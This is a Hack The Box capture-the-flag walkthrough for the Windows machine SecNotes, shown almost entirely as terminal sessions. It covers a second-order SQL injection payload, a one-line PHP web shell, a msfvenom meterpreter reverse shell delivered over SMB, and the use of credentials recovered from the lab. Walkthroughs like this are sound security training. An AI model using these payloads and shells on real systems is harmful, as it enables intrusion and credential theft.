| Category          | Details                                                  |
|-------------------|----------------------------------------------------------|
| 📝 **Name**       | [SecNotes](https://app.hackthebox.com/machines/SecNotes) |  
| 🏷 **Type**       | HTB Machine                                              |
| 🖥 **OS**         | Windows                                                  |
| 🎯 **Difficulty** | Medium                                                   |
| 📁 **Tags**       | 2nd order SQLi, WSL                                      |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB SecNotes]
└─$ nmap -sS -sC -sV -p- $TARGET                                         
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-09 15:24 +0200
Nmap scan report for 10.129.42.147
Host is up (0.039s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2026-05-09T06:27:23-07:00
| smb2-time: 
|   date: 2026-05-09T13:27:20
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h20m04s, deviation: 4h02m31s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.95 seconds
```

#### Discover 2nd order SQLi in `username` parameter
```
┌──(magicrc㉿perun)-[~/attack/HTB SecNotes]
└─$ SQLI=$(echo -n "' UNION SELECT 1,2,'SQLi','SQLi' -- -" | jq -sRr @uri)
curl -s http://secnotes.htb/register.php -d "username=$SQLI&password=password&confirm_password=password" -o /dev/null && \
curl -sLc cookies.txt http://secnotes.htb/login.php -d "username=$SQLI&password=password" /dev/null | grep SQLi
        <h1>Viewing Secure Notes for <b>' UNION SELECT 1,2,'SQLi','SQLi' -- -</b></h1>
        <button class="accordion"><strong>2</strong>  <small>[SQLi]</small></button><a href=/home.php?action=delete&id=1" class="btn btn-danger"><strong>X</strong></a><div class="panel center-block text-left" style="width: 78%;"><pre>SQLi</pre></div>  </div>
```

#### Discover plaintext credentials in `notes` table
```
┌──(magicrc㉿perun)-[~/attack/HTB SecNotes]
└─$ SQLI=$(echo -n "' UNION SELECT 1,id,note,title FROM posts-- -" | jq -sRr @uri)
curl -s http://secnotes.htb/register.php -d "username=$SQLI&password=password&confirm_password=password" -o /dev/null && \
curl -sLc cookies.txt http://secnotes.htb/login.php -d "username=$SQLI&password=password" /dev/null | grep tyler             
          Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII)<br/>Please contact <strong>tyler@secnotes.htb</strong> using the contact link below with any questions.        </div>
tyler / 92g!mA8BGjOirkL%OG*&</pre></div>        </div>
```

#### List SMB shares using `tyler:92g!mA8BGjOirkL%OG*&` credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB SecNotes]
└─$ smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H secnotes.htb --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.42.164:445       Name: secnotes.htb              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE
[*] Closed 1 connections
```

#### Enumerate `new-site` SMB share
```
┌──(magicrc㉿perun)-[~/attack/HTB SecNotes]
└─$ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //$TARGET/new-site
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May  9 18:02:30 2026
  ..                                  D        0  Sat May  9 18:02:30 2026
  iisstart.htm                        A      696  Thu Jun 21 17:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018

                7736063 blocks of size 4096. 3395563 blocks available
```
After brief investigation we have discovered that this share is being using by IIS running at port 8808.

#### Generate `windows/x64/meterpreter/reverse_tcp` reverse shell and deliver it over SMB
```
┌──(magicrc㉿perun)-[~/attack/HTB SecNotes]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe && \
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //$TARGET/new-site -c 'put shell.exe'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
putting file shell.exe as \shell.exe (49.3 kB/s) (average 49.3 kB/s)
```

#### Prepare `cmd.php` and deliver it over SMB
```
┌──(magicrc㉿perun)-[~/attack/HTB SecNotes]
└─$ echo '<?php if(isset($_REQUEST["cmd"])){ echo shell_exec($_REQUEST["cmd"] . " 2>&1"); die; }?>' > cmd.php && \
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //$TARGET/new-site -c 'put cmd.php'
putting file cmd.php as \cmd.php (1.2 kB/s) (average 1.2 kB/s)
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB SecNotes]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT $LPORT; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.193:4444
```

#### Spawn reverse shell connection using `cmd.php`
```
┌──(magicrc㉿perun)-[~/attack/HTB SecNotes]
└─$ curl http://$TARGET:8808/cmd.php?cmd=shell.exe
```

#### Confirm foothold gained
```
[*] Sending stage (230982 bytes) to 10.129.42.164
[*] Meterpreter session 1 opened (10.10.16.193:4444 -> 10.129.42.164:56072) at 2026-05-10 13:36:48 +0200

meterpreter > getuid
Server username: SECNOTES\tyler
```

#### Capture user flag
```
meterpreter > cat C:\\Users\\tyler\\Desktop\\user.txt
3c245462e23332fb02a11d777a637824
```

### Root flag

#### Discover Linux running on target using WSL
```
meterpreter > shell
Process 5448 created.
Channel 3 created.
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>cd C:\Users\tyler\Desktop
cd C:\Users\tyler\Desktop

C:\Users\tyler\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\Users\tyler\Desktop

05/09/2026  09:33 AM    <DIR>          .
05/09/2026  09:33 AM    <DIR>          ..
06/22/2018  03:09 AM             1,293 bash.lnk
08/02/2021  03:32 AM             1,210 Command Prompt.lnk
04/11/2018  04:34 PM               407 File Explorer.lnk
05/09/2026  09:33 AM    <DIR>          Microsoft
06/21/2018  05:50 PM             1,417 Microsoft Edge.lnk
06/21/2018  09:17 AM             1,110 Notepad++.lnk
05/09/2026  08:55 AM                34 user.txt
08/19/2018  10:59 AM             2,494 Windows PowerShell.lnk
               7 File(s)          7,965 bytes
               3 Dir(s)  13,873,299,456 bytes free

C:\Users\tyler\Desktop>type bash.lnk
type bash.lnk
L�F w������V�   �v(���  ��9P�O� �:i�+00�/C:\V1�LIWindows@       ﾋL���LI.h���&WindowsZ1�L<System32B      ﾋL���L<.p�k�System32▒Z2��LP� bash.exeB  ﾋL<��LU.�Y����bash.exe▒K-JںݜC:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32�%�
                                                             �wN�▒�]N�D.��Q���`�Xsecnotesx�<sAA��㍧�o�:u��'�/�x�<sAA��㍧�o�:u��'�/�=    �Y1SPS�0��C�G����sf"=dSystem32 (C:\Windows)�1SPS��XF�L8C���&�m�q/S-1-5-21-1791094074-1363918840-4199337083-1002�1SPS0�%��G▒��`����%
        bash.exe@������
                       �)
                         Application@v(���      �i1SPS�jc(=�����O�▒�MC:\Windows\System32\bash.exe91SPS�mD��pH�H@.�=x�hH�(�bP
C:\Users\tyler\Desktop>bash.exe id
bash.exe id
/usr/bin/id: /usr/bin/id: cannot execute binary file

C:\Users\tyler\Desktop>wsl.exe id
wsl.exe id
uid=0(root) gid=0(root) groups=0(root)
```

#### Discover `Administrator` credentials in `/root/.bash_history`
```
C:\Users\tyler\Desktop>wsl.exe ls -la /root
wsl.exe ls -la /root
total 8
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem

C:\Users\tyler\Desktop>wsl.exe cat /root/.bash_history
wsl.exe cat /root/.bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exit
```

#### Capture root flag
```
┌──(magicrc㉿perun)-[~/attack/HTB SecNotes]
└─$ smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //$TARGET/c$ -c 'get Users\Administrator\Desktop\root.txt' 2>/dev/null && cat root.txt
70f55ab04fe84822eb9be6bbcd9b07c5
```
